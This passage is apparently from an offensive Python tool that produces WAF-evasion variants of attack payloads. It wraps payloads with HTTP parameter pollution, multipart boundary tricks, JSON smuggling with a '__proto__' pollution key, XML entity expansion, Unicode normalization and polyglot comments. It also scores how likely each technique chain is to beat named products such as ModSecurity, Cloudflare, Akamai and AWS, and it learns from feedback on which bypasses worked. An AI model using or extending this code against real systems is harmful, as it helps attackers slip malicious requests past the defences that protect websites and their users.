    def _parameter_pollution(self, payload: str) -> str:
        """Use HTTP parameter pollution to confuse WAF."""
        if '=' in payload:
            parts = payload.split('=', 1)
            return f"{parts[0]}={parts[1]}&{parts[0]}=benign&{parts[0]}={parts[1]}"
        return payload

    def _multipart_boundary_bypass(self, payload: str) -> str:
        """Use multipart/form-data boundary manipulation."""
        import random
        boundary = "----WebKitFormBoundary" + ''.join(
            random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
            for _ in range(16)
        )
        return f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\n{payload}\r\n--{boundary}--"

    def _json_smuggling(self, payload: str) -> str:
        """Smuggle payload in JSON structure."""
        import json
        try:
            # Attempt to embed in JSON
            smuggled = {
                "data": payload,
                "type": "application/json",
                "__proto__": {"pollution": payload}
            }
            return json.dumps(smuggled)
        except:
            return f'{{"data":"{payload}"}}'

    def _xml_entity_expansion(self, payload: str) -> str:
        """Use XML entity expansion (billion laughs variant)."""
        return f"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "{payload}">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol2;</lolz>"""

    def _unicode_normalization(self, payload: str) -> str:
        """Use Unicode normalization forms to bypass filters."""
        try:
            import unicodedata
            # Try different normalization forms
            nfd = unicodedata.normalize('NFD', payload)
            nfc = unicodedata.normalize('NFC', payload)
            nfkd = unicodedata.normalize('NFKD', payload)
            # Return the one most different from original
            if len(nfd) != len(payload):
                return nfd
            elif len(nfkd) != len(payload):
                return nfkd
            return nfc
        except:
            return payload

    def _polyglot_construction(self, payload: str) -> str:
        """Create polyglot payload that works across multiple contexts."""
        # Construct a payload valid in multiple parsers
        polyglot = f"/*{payload}*/-->{payload}<!--/*{payload}*/"
        return polyglot

    def _calculate_evasion_confidence(self, technique_chain: list, waf_type: str,
                                      recon_confidence: float = 0.5,
                                      honeypot_confidence: float = 0.5) -> float:
        """
        Calculate confidence score for an evasion technique chain.

        SYNERGISTIC: Confidence increases when backed by recon and honeypot intelligence.

        Args:
            technique_chain: List of evasion techniques
            waf_type: Type of WAF
            recon_confidence: Confidence from reconnaissance data (0-1)
            honeypot_confidence: Confidence from honeypot learnings (0-1)

        Returns:
            Confidence score between 0 and 1
        """
        # Base confidence
        confidence = 0.5

        # More techniques = higher confidence (up to a point)
        technique_bonus = min(len(technique_chain) * 0.1, 0.3)
        confidence += technique_bonus

        # Check against success history
        chain_key = tuple(technique_chain)
        if chain_key in self.success_patterns:
            success_rate = self.success_patterns[chain_key]
            confidence = (confidence + success_rate) / 2

        # WAF-specific adjustments
        waf_factors = {
            'modsecurity': 0.8,
            'cloudflare': 0.7,
            'akamai': 0.6,
            'aws': 0.75,
            'generic': 0.9
        }
        confidence *= waf_factors.get(waf_type, 0.7)

        # SYNERGY BOOST: Intelligence from recon increases confidence
        recon_boost = (recon_confidence - 0.5) * 0.3  # Up to +15% boost
        confidence += recon_boost

        # SYNERGY BOOST: Intelligence from honeypot increases confidence
        honeypot_boost = (honeypot_confidence - 0.5) * 0.3  # Up to +15% boost
        confidence += honeypot_boost

        # SYNERGY MULTIPLIER: When both recon and honeypot data present, extra boost
        if recon_confidence > 0.6 and honeypot_confidence > 0.6:
            confidence *= 1.2  # 20% synergy multiplier

        return min(confidence, 0.95)  # Cap at 95%

    def _update_evasion_memory(self, original: str, variants: list,
                               feedback: Optional[dict]):
        """
        Update internal memory with evasion attempt results.

        Args:
            original: Original payload
            variants: List of generated variants
            feedback: Optional feedback about which variants succeeded
        """
        # Store in memory
        memory_entry = {
            'original': original,
            'variants': variants,
            'timestamp': torch.cuda.Event() if torch.cuda.is_available() else None,
            'feedback': feedback
        }

        self.evasion_memory.append(memory_entry)

        # Limit memory size
        if len(self.evasion_memory) > self.max_memory_size:
            self.evasion_memory.pop(0)

        # Update success patterns if feedback provided
        if feedback and 'successful_variants' in feedback:
            for variant_idx in feedback['successful_variants']:
                if variant_idx < len(variants):
                    techniques = tuple(variants[variant_idx]['techniques'])
                    if techniques in self.success_patterns:
                        # Update running average
                        old_rate = self.success_patterns[techniques]
                        self.success_patterns[techniques] = (old_rate + 1.0) / 2
                    else:
                        self.success_patterns[techniques] = 0.8

    def get_evasion_statistics(self) -> dict:
        """
        Get statistics about WAF bypass attempts and success rates.

        Returns:
            Dictionary with evasion stats
        """
        return {
            'memory_size': len(self.evasion_memory),
            'learned_patterns': len(self.success_patterns),
            'top_techniques': sorted(
                self.success_patterns.items(),
                key=lambda x: x[1],
                reverse=True
            )[:5]
        }

    def _calculate_synergy_level(self, recon_data: Optional[dict],
                                 honeypot_learnings: Optional[dict],
                                 intelligence_feedback: dict) -> str:
        """
        Calculate the level of synergy between intelligence sources.

        Returns:
            Synergy level: 'none', 'low', 'medium', 'high', 'maximum'
        """
        sources = 0
        if recon_data and 'detected_waf' in recon_data:
            sources += 1
        if honeypot_learnings and 'defender_patterns' in honeypot_learnings:
            sources += 1
        if intelligence_feedback and len(intelligence_feedback) > 0:
            sources += 1

        if sources == 0:
            return 'none'
        elif sources == 1:
            return 'low'
        elif sources == 2:
            return 'high'
        else:  # sources == 3
            return 'maximum'
